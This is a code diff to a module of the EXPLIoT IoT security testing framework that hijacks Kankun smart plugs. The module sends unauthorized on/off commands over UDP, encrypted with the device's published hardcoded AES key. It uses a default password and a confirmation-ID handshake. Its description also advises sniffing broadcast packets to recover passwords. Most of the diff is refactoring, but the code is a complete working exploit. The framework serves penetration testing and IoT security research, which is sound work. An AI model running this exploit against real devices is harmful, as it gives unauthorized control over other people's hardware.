@@ -7,11 +7,47 @@ from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 from expliot.core.tests.test import TCategory, Test, TLog, TTarget
+from expliot.core.common import bstr
+
+DEFAULT_PORT = 27431
+DEFAULT_PASS = "nopassword"
+AES_KEY = b"fdsl;mewrjope456fds4fbvfnjwaugfo"
+
+
+# These responses can be used for testing.
+# Response 1 - with confirm ID
+# R1 = b"\xc4\x2c\xb8\x27\x6a\xeb\x4e\xf5\x01\x94\x3c\x31\xc2\x07" \
+#     b"\xfb\x1c\x7e\x0a\x54\x6a\x05\xe7\xe7\xa7\x68\xf5\xae\x89" \
+#     b"\x55\xbd\x29\xa4\x62\x0e\x5f\x50\xa9\xef\x5c\xef\x74\xa3" \
+#     b"\xc5\xe2\x48\xfb\x1f\x12\xb3\xc4\x27\xdb\x5f\xd5\x11\x96" \
+#     b"\x80\x7d\x74\xd9\xd2\x4e\xd5\xfc"
+
+# Response 2 - ACK
+# R2 = b"\xc4\x2c\xb8\x27\x6a\xeb\x4e\xf5\x01\x94\x3c\x31\xc2\x07" \
+#     b"\xfb\x1c\x7e\x0a\x54\x6a\x05\xe7\xe7\xa7\x68\xf5\xae\x89" \
+#     b"\x55\xbd\x29\xa4\x01\x32\x48\xa8\x04\xaf\x36\x8f\xbb\xe5" \
+#     b"\xb2\xc6\x84\xc8\x8b\x4d\x6e\xda\x4d\xdd\xf9\xc8\xaa\x94" \
+#     b"\xfb\x37\x31\x1c\x1e\xe3\x5c\x62"
 
 
 # pylint: disable=bare-except
 class KHijack(Test):
-    """Tests for Kankun smart plugs."""
+    """
+    Tests for Kankun smart plugs.
+
+    Output Format:
+    [
+        {
+            "command": "lan_phone%foobar...",
+            "response": "lan_device%foorbar...confirmid#172345",
+            "received_confirmation_id": 172345
+        },
+        {
+            "command2": "lan_phone%foobar...",
+            "response2": "lan_device%foorbar...,
+        }
+    ]
+    """
 
     def __init__(self):
         """Initialize the test."""
@@ -19,11 +55,11 @@ class KHijack(Test):
             name="hijack",
             summary="Kankun Smart Plug Hijacker",
             descr="This test case connects to the Kankun smart plug and sends"
-            "unauthorized switch ON/OFF commands to it. If you don't "
-            "know the password, try with the default or sniff the network "
-            "for UDP packets as the commands containing the password are "
-            "broadcasted. You can decrypt the packets easily using the AES "
-            "key which is published.",
+                  "unauthorized switch ON/OFF commands to it. If you don't "
+                  "know the password, try with the default or sniff the network "
+                  "for UDP packets as the commands containing the password are "
+                  "broadcasted. You can decrypt the packets easily using the AES "
+                  "key which is published.",
             author="Aseem Jakhar and Sneha Rajguru",
             email="aseemjakhar@gmail.com",
             ref=["https://payatu.com/hijacking-kankun/"],
@@ -37,22 +73,24 @@ class KHijack(Test):
         self.argparser.add_argument(
             "-p",
             "--rport",
-            default=27431,
+            default=DEFAULT_PORT,
             type=int,
-            help="Port number of the smart plug service. Default is 27431",
+            help="Port number of the smart plug service. Default "
+                 "is {}".format(DEFAULT_PORT),
         )
         self.argparser.add_argument(
             "-m",
             "--rmac",
             required=True,
             help="MAC address of Kankun smart plug. Use colon delimited format "
-            "with hex digits in small letters, e.g., ff:ee:dd:00:01:02",
+                 "with hex digits in small letters, e.g., ff:ee:dd:00:01:02",
         )
         self.argparser.add_argument(
             "-w",
             "--passwd",
-            default="nopassword",
-            help="The password (if any) for Kankun smart plug. Default is the string 'nopassword'",
+            default=DEFAULT_PASS,
+            help="The password (if any) for Kankun mart plug. Default is the "
+                 "string '{}'".format(DEFAULT_PASS),
         )
         self.argparser.add_argument(
             "-c",
@@ -61,105 +99,103 @@ class KHijack(Test):
             help="The command to send to the smart plug. Valid commands are on/off",
         )
 
-        self.key = b"fdsl;mewrjope456fds4fbvfnjwaugfo"
-
-    def encrypt_decrypt(self, string, encrypt=True):
+    @staticmethod
+    def encrypt_decrypt(message, encrypt=True):
         """
         Encrypt/Decrypt a string using the known AES key of the smart plug.
 
-        :param string: The string to encrypt or decrypt
-        :param encrypt: True means encrypt (default), false means decrypt
-        :return: The encrypted/decrypted string
+        Args:
+            message(bytes): The message to encrypt or decrypt
+            encrypt(bool): True means encrypt (default), false means decrypt
+        Returns:
+            bytes: The encrypted/decrypted bytes
         """
-        string = str.encode(string)
         cipher = Cipher(
-            algorithms.AES(self.key), modes.ECB(), backend=default_backend()  # nosec
+            algorithms.AES(AES_KEY), modes.ECB(), backend=default_backend()  # nosec
         )
 
         if encrypt is True:
             padder = padding.PKCS7(algorithms.AES.block_size).padder()
-            padded_string = padder.update(string)
+            padded_string = padder.update(message)
             padded_string += padder.finalize()
 
             encryptor = cipher.encryptor()
             cipher_text = encryptor.update(padded_string) + encryptor.finalize()
             return cipher_text
-
         decryptor = cipher.decryptor()
-        decrypted_text = decryptor.update(string) + decryptor.finalize()
+        decrypted_text = decryptor.update(message) + decryptor.finalize()
+        return decrypted_text
 
-        unpadder = padding.PKCS7(128).unpadder()
-        data = unpadder.update(decrypted_text)
-        clear_text = data + unpadder.finalize()
-        return clear_text
-
-    def send_receive(self, ip_address, port, message):
+    def send_receive(self, ip_addr, port, message):
         """
         Send and then receive encrypted data to/from the smart plug.
 
-        :param ip: The IP address of the smart plug
-        :param port: The port number of the listening service
-        :param message: The plaintext message
-        :return: The response received from the smart plug
+        Args:
+            ip_addr(str): The IP address of the smartplug
+            port(int): Port number of the listening service
+            message(str): The plaintext message
+        Returns:
+            bytes: The response received from the smart plug
         """
         response = None
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
-            sock.connect((ip_address, port))
+            sock.connect((ip_addr, port))
             sock.settimeout(20)
             sock.send(self.encrypt_decrypt(message))
             response = sock.recv(1024)
             response = self.encrypt_decrypt(response, encrypt=False)
         except:  # noqa: E722
-            TLog.fail("Couldn't receive/decrypt response")
+            TLog.fail("Couldn't receive/decrypt response.")
+            raise
         finally:
             sock.close()
         return response
 
-    def create_message(self, command, cid=None):
+    def create_message(self, cmd, cid=None):
         """
-        Create the command message to be sent to the the smart plug.
+        Create the command message to be sent to the the smart plug
 
-        :param command: The command to send - open/close/confirm
-        :param cid: The confirmation ID used in confirm command
-        :return: The command message
+        Args:
+            cmd(str): the command to send - open/close/confirm
+            cid(str): confirmation id used in confirm command
+        Returns:
+            bytes: The command message
         """
         message = "lan_phone%{}%{}".format(self.args.rmac, self.args.passwd)
 
-        if command == "open":
+        if cmd == "open":
             message = "{}%open%request".format(message)
-        elif command == "close":
+        elif cmd == "close":
             message = "{}%close%request".format(message)
-        elif command == "confirm":
+        elif cmd == "confirm":
             message = "{}%confirm#{}%request".format(message, cid)
-        return message
+        return message.encode()
 
     @staticmethod
     def get_confirm_id(message):
         """
-        Extract the confirmation ID from the response message.
+        Extract the confirmation id from the response message
 
-        :param message: The response message
-        :return: The confirmation ID
+        Args:
+            message(bytes): The response message from the smart plug
+        Returns:
+            str: The confirmation id, if found or None
         """
         # Get the confirmation ID number only!!
-        confirmation_id = re.search(r"confirm#(\w+)", message.decode("utf-8"))
+        confirmation_id = re.search(r"confirm#(\w+)", bstr(message))
         if confirmation_id is not None:
             return confirmation_id.group(1)
-
         return None
 
     def execute(self):
         """Execute the test."""
         TLog.generic(
-            "Sending unauthorized command ({}) to Kankun smart plug on ({}) port ({})".format(
+            "Sending unauthorized command ({}) to Kankun smart "
+            "plug on ({}) port ({})".format(
                 self.args.cmd, self.args.rhost, self.args.rport
             )
         )
-        print(
-            "--cmd ({}) cmd is on? ({})".format(self.args.cmd, (self.args.cmd == "on"))
-        )
-
         if self.args.cmd.lower() == "on":
             operation = "open"
         elif self.args.cmd.lower() == "off":
@@ -169,8 +205,8 @@ class KHijack(Test):
                 passed=False, reason="Unknown --cmd ({})".format(self.args.cmd)
             )
             return
+
         message = self.create_message(operation)
-        TLog.trydo("Sending {} command: ({})".format(operation, message))
         # Step 1: Send command and receive the confirmation ID response
         response = self.send_receive(self.args.rhost, self.args.rport, message)
 
@@ -180,8 +216,6 @@ class KHijack(Test):
                 reason="Communication error while sending message({})".format(message),
             )
             return
-
-        TLog.success("Received response: ({})".format(response.decode("utf-8")))
         # Get the confirmation ID
         cid = self.get_confirm_id(response)
 
@@ -191,11 +225,10 @@ class KHijack(Test):
                 reason="Couldn't extract confirmation ID from ({})".format(response),
             )
             return
-
-        TLog.success("Received confirmation ID: ({})".format(cid))
+        self.output_handler(command=message,
+                            response=response,
+                            received_confirmation_id=cid)
         message = self.create_message("confirm", cid)
-        TLog.trydo("Sending confirm command: ({})".format(message))
-
         # Step 2: Send confirmation command with the confirmation ID and receive ACK response
         response = self.send_receive(self.args.rhost, self.args.rport, message)
         if response is None:
@@ -204,4 +237,4 @@ class KHijack(Test):
                 reason="Communication error while sending message({})".format(message),
             )
             return
-        TLog.success("Received response: ({})".format(response.decode("utf-8")))
+        self.output_handler(command2=message, response2=response)
